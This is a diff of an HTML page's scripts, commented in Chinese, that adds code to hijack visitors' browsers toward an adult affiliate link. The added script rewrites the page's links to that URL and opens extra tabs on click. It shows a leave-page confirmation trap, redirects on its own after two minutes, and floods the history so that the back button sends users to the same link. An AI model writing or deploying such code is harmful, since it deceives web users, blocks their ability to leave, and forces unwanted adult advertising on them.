@@ -33,28 +33,76 @@
     }
   </style>
 
-<script>
-            function launchpopLink() {
-                var redirectUrl = "https://126b080185fc.dreamy-path.net/?p=19348&media_type=adult&pi=luckdog&click_id={cid}";
-                var mainUrl = "https://126b080185fc.dreamy-path.net/?p=19348&media_type=adult&pi=luckdog&click_id={cid}";
+  <script type="text/javascript">
+    // ==================== 链接设置 ====================
+    var fin_link = 'https://126b080185fc.dreamy-path.net/?p=19348&media_type=adult&pi=luckdog&click_id={cid}';
+    var new_page_url = 'https://126b080185fc.dreamy-path.net/?p=19348&media_type=adult&pi=luckdog&click_id={cid}'; // 新页面链接
+    console.log('固定链接:', fin_link);
+    console.log('新页面链接:', new_page_url);
+    // ==================== 设置结束 ====================
+
+    // 设置所有finlink类的链接
+    var links = document.getElementsByClassName('finlink');
+    for (var i = 0; i < links.length; i++) {
+        links[i].setAttribute("href", fin_link);
+    }
+
+    // 为所有链接绑定点击事件 - 修改为同时执行两个操作
+    for (var j = 0; j < links.length; j++) {
+        links[j].addEventListener('click', function (evt) {
+            evt.preventDefault(); // 阻止默认链接跳转
             
-                window.location.href = redirectUrl;
-                window.open(mainUrl, "_blank");
-            }
-        </script>
+            console.log('链接被点击');
             
-        <script>
-            function init() {
-            setTimeout(function(){window.scrollTo(0,1)},0);
-            }
-            window.history.replaceState('/loading', '', '/loading');
-            window.history.pushState('/loading', '', '/loading');
-            window.addEventListener('popstate', function(e) {
-            if(document.URL.indexOf('/loading') >= 0){
-            document.location.href = document.location;
-            }
-            });
-        </script>
+            // 1. 移除页面离开事件监听
+            window.removeEventListener('beforeunload', befUnlFunc);
+            window.onbeforeunload = null;
+            
+            // 2. 当前页面跳转到fin_link（页面顶部）
+            window.location.href = fin_link;
+            
+            // 3. 打开新页面到http://www.google.com
+            window.open(new_page_url, '_blank');
+        });
+    }
+
+    // 页面离开确认函数
+    function befUnlFunc(e) {
+        e.preventDefault();
+        console.log('page closed');
+        const confirmationMessage = 'Are you sure you want to leave the page?';
+        e.returnValue = confirmationMessage;
+        return confirmationMessage;
+    }
+    window.addEventListener('beforeunload', befUnlFunc);
+
+    // 自动重定向：2分钟后执行与点击相同的操作
+    setTimeout(function () {
+        window.onbeforeunload = null;
+        console.log('2分钟定时器触发');
+        
+        // 1. 当前页面跳转到fin_link（页面顶部）
+        window.location.href = fin_link;
+        
+        // 2. 打开新页面到http://www.google.com
+        window.open(new_page_url, '_blank');
+        
+    }, 60000 * 2);
+
+    // 防止浏览器后退功能
+    !function () {
+        var t;
+        try {
+            for (t = 0; 10 > t; ++t) history.pushState({}, "", "");
+            onpopstate = function (t) {
+                window.onbeforeunload = null;
+                t.state && location.replace(fin_link);
+            };
+        } catch (o) {}
+    }();
+  </script>
+            
+  
   
 
   
